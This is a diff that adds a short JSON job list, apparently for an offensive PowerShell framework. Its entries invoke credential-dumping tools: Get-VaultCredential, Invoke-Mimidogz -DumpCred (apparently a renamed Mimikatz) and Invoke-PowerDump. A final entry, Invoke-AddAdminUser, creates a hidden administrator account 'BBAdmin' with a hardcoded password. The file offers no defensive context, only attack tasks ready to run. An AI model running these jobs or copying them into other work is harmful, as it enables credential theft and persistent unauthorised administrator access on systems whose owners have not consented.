@@ -1,0 +1,24 @@
+[{
+    "jobName"   :"Get-VaultCredential",
+    "command"   :"Get-VaultCredential | out-string",
+    "runType"   :"thread",
+    "scriptName":"Get-VaultCredential.ps1"
+},
+{
+    "jobName"  	:"Mimidogz",
+	"command"	:"Invoke-Mimidogz -DumpCred | out-string",
+	"runType"	:"thread",
+	"scriptName":"Invoke-Mimidogz.ps1"
+},
+{
+	"jobName"	:"PowerDump",
+	"command"	:"Invoke-PowerDump | out-string",
+	"runType"	:"thread",
+	"scriptName":"Invoke-PowerDump.ps1"
+},
+{
+	"jobName"	:"AddAdminUser",
+	"command"	:"Invoke-AddAdminUser -UserName \"BBAdmin\" -Password \"BBPassword1!\" | Out-String",
+	"runType"	:"thread",
+	"scriptName":"Invoke-AddAdminUser.ps1"
+}]
